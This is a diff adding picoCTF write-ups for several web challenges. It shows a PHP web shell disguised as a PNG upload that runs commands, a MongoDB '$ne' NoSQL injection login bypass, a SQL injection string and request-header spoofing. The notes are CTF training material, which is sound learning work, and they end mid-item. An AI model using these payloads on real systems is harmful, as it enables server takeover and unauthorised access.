@@ -1,0 +1,202 @@
+# PICO CTF Write Up (All Medium Practices)
+
+
+
+## Trickster
+
+instruction.txt : 
+
+```
+Let's create a web app for PNG Images processing.
+It needs to:
+Allow users to upload PNG images
+	look for ".png" extension in the submitted files
+	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
+after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
+```
+
+with these information 1. we can use double extension 2. just add PNG Infront of the file for the file checking and we are good to go
+
+```php
+PNG<?php system($_GET['cmd']); ?>
+```
+
+and access the cmd
+
+```
+http://atlas.picoctf.net:57583/uploads/test.png.php?cmd=pwd
+```
+
+the flag is at /var/www/html/ and cat the txt file
+
+
+
+## No Sql Injection
+
+looking at the index.html there are some important information about the logging :
+
+```html
+<form id="loginForm">
+    <label for="email">Email:</label>
+    <input id="email" name="email" required><br>
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required><br>
+    <button type="submit">Login</button>
+</form>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const formData = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value
+        };
+
+        fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(formData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                sessionStorage.setItem('email', data.email);
+                sessionStorage.setItem('token', data.token);
+                window.location.href = '/admin';
+            } else {
+                alert('Invalid credentials');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
+</script>
+```
+
+* Login is sent a POST request to /login 
+* sent via JSON format :arrow_right: so the **server.js** will process it as a JSON
+* If the login is successful than a token will be produced to sessionStorage
+
+looking at the server.js vulnerabilities :
+
+``` js
+app.post("/login", async (req, res) => {
+    const { email, password } = req.body;
+
+    try {
+        const user = await User.findOne({
+            email:
+                email.startsWith("{") && email.endsWith("}")
+                    ? JSON.parse(email)
+                    : email,
+            password:
+                password.startsWith("{") && password.endsWith("}")
+                    ? JSON.parse(password)
+                    : password,
+        });
+
+        if (user) {
+            res.json({
+                success: true,
+                email: user.email,
+                token: user.token,
+                firstName: user.firstName,
+                lastName: user.lastName,
+            });
+        } else {
+            res.json({ success: false });
+        }
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+```
+
+* It uses MongoDB
+
+* Vulnerabilities is located at the JSON parsing, 
+
+  ```js
+  email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email
+  ```
+
+  * here the parsing is only specified by {} so that payload like `{ "$ne": null }` might work
+
+* If the injection works, the server will be sending some response like :
+
+  ```json
+  {
+    "success": true,
+    "email": "picoplayer355@picoctf.org",
+    "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==",
+    "firstName": "pico",
+    "lastName": "player"
+  }
+  ```
+
+the token is a base64 encoded flag
+
+
+
+## SQLiLite
+
+basic SQL Injection required
+
+```
+admin' '1' = '1
+```
+
+
+
+## Search Source
+
+#### 1). Manual Search the Source file for the flag
+
+#### 2). Download all the web sources file via linux
+
+```
+wget -r -k -p -np http://~~~~~.picoctf.net:~~~
+```
+
+**-r** = recursive download, download everything linked within the same site
+
+**-k** = convert downloaded into offline mode 
+
+**-p** = ensure all viewable files are downloaded
+
+**-np** = prevent going upward and download unrelatable resources
+
+##### then, 
+
+```
+grep -ri "picoCTF{" .
+```
+
+**-ri** = recursive and ignore case(insensitive case) searching
+
+**.** = in the current directory and all it's subdirectories
+
+
+
+
+
+## findme
+
+Directly intercept the request and decode the `id` parameter's value from the GET requests (2 part flag)
+
+
+
+
+
+## whoareyou
+
+This CTF requires us to intercept and modify the requests method base on web's requirements 
+
+base on :
+
+1). must use PicoBrowser :arrow_right: change `User-Agent` to PicoBrowser
+
+2). "I Don't trust users from other site" :arrow_right: add `Referer` with the same website
+
+3). "Sorry, this site only worked in 2018." :arrow_right: 
+
